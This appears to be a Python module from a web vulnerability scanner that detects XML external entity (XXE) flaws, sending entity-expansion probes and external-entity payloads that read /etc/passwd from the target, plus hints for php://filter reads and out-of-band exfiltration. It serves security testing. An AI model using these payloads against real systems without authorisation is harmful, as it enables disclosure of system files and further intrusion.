from __future__ import annotations
from huntnyx.core.common import *  # noqa: F401,F403

# ════════════════════════════════════════════════════════════════════════
#  XML EXTERNAL ENTITY (XXE)  — in-band / reflection-based
#
#  Only runs against endpoints that are genuinely XML (ip.body_is_xml), which
#  today means a raw request loaded with -r whose Content-Type is XML. We never
#  guess XML endpoints, so there is no speculative fan-out and no guessing FP.
#
#  Two independent classes:
#
#    xxe.entity_expand (STRONG)  a custom INTERNAL entity carrying a random
#                                token expands in the response (token present,
#                                literal "&ent;" absent) ⇒ the parser resolves
#                                entities at all. Necessary precondition.
#
#    xxe.file_read     (PROOF)   an EXTERNAL entity `SYSTEM "file:///etc/passwd"`
#                                surfaces the root-anchored passwd line, absent
#                                from baseline ⇒ arbitrary file disclosure. This
#                                is the unforgeable one.
#
#  entity_expand + file_read → two classes → CONFIRMED. file_read alone stays
#  TENTATIVE (clamped by min_classes), and entity_expand alone scores below the
#  reporting floor (entity processing without disclosure is not a finding).
#
#  NOTE: purely BLIND XXE (no reflection, hardened parser) is NOT detectable
#  in-band and is intentionally reported as nothing here — that case needs an
#  OAST/interaction server (a separate, planned capability).
# ════════════════════════════════════════════════════════════════════════


_XXE_PASSWD_ROOT_RE = re.compile(r"\broot:[^\n:]*:0:0:")


class XXEModule(_Module):
    name = vuln = "xxe"

    def requires(self, ip):
        return ip.dynamic and ip.body_is_xml

    @staticmethod
    def _send(http, ip, xml):
        ctype = ip.content_type or "application/xml"
        return http.post(ip.url, body=xml, headers={"Content-Type": ctype}, cache=False)

    def probe(self, http, ip):
        if not self.requires(ip):
            return []
        sigs = []
        ent = "hnyx" + _rand(6)
        token = "TOK" + _rand(12)

        base = self._send(http, ip, ip.body or "<r/>")
        base_txt = base.text or ""
        base_root = bool(_XXE_PASSWD_ROOT_RE.search(base_txt))

        # class 1: internal entity expansion
        doc_expand = (f'<?xml version="1.0"?>'
                      f'<!DOCTYPE r [<!ENTITY {ent} "{token}">]>'
                      f'<r>&{ent};</r>')
        r1 = self._send(http, ip, doc_expand)
        expanded = token in (r1.text or "") and f"&{ent};" not in (r1.text or "")
        if expanded:
            sigs.append(Signal(
                self.vuln, "internal-entity-expand", "xxe.entity_expand",
                SignalStrength.STRONG,
                "XML parser expanded a custom internal entity",
                {"payload": doc_expand, "status": r1.status}))

        # class 2: external entity file read (generic doc, then original body)
        file_hit = self._file_read(http, ip, ent, base_root)
        if file_hit:
            payload, status = file_hit
            sigs.append(Signal(
                self.vuln, "external-entity-file", "xxe.file_read",
                SignalStrength.PROOF,
                f"external entity read /etc/passwd (root:...:0:0:) (HTTP {status})",
                {"payload": payload, "status": status}))

        if self._debug:
            UI.dim(f"      [xxe] {ip.url} expand={'Y' if expanded else 'n'} "
                   f"file={'Y' if file_hit else 'n'} base_root={base_root}")
        return sigs

    def _file_read(self, http, ip, ent, base_root):
        docs = [
            (f'<?xml version="1.0"?>'
             f'<!DOCTYPE r [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>'
             f'<r>&{ent};</r>'),
        ]
        original = self._inject_original(ip.body or "", ent)
        if original:
            docs.append(original)
        for doc in docs:
            r = self._send(http, ip, doc)
            if (not base_root) and _XXE_PASSWD_ROOT_RE.search(r.text or ""):
                return doc, r.status
        return None

    @staticmethod
    def _inject_original(body, ent):
        """Best-effort: reuse the app's own XML shape — prepend a DOCTYPE with
        an external entity right after the XML declaration and reference &ent;
        in the first text node (falls back to appending an element)."""
        if not body.strip():
            return None
        doctype = (f'<!DOCTYPE r [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>')
        m = re.match(r"\s*<\?xml[^>]*\?>", body)
        head, rest = (body[:m.end()], body[m.end():]) if m else ("", body)
        injected, n = re.subn(r">([^<>]*)<", f">&{ent};<", rest, count=1)
        if n == 0:
            injected = rest + f"<r>&{ent};</r>"
        return head + doctype + injected


def phase_xxe(target, config, runner):
    return _vuln_phase(target, config, runner, "xxe")


def _xxe_exploit_lines(techniques):
    return [
        "impact : arbitrary file read; often SSRF / OOB exfil via parameter entities",
        "verify : swap file:///etc/passwd for a php://filter source read, or use",
        "         an OAST host in an external DTD for blind cases — authorized only",
    ]


def _r_xxe(d):
    return _r_injection("XXE (XML external entity)", d, exploit=_xxe_exploit_lines)


INJECTION_MODULES.append(XXEModule)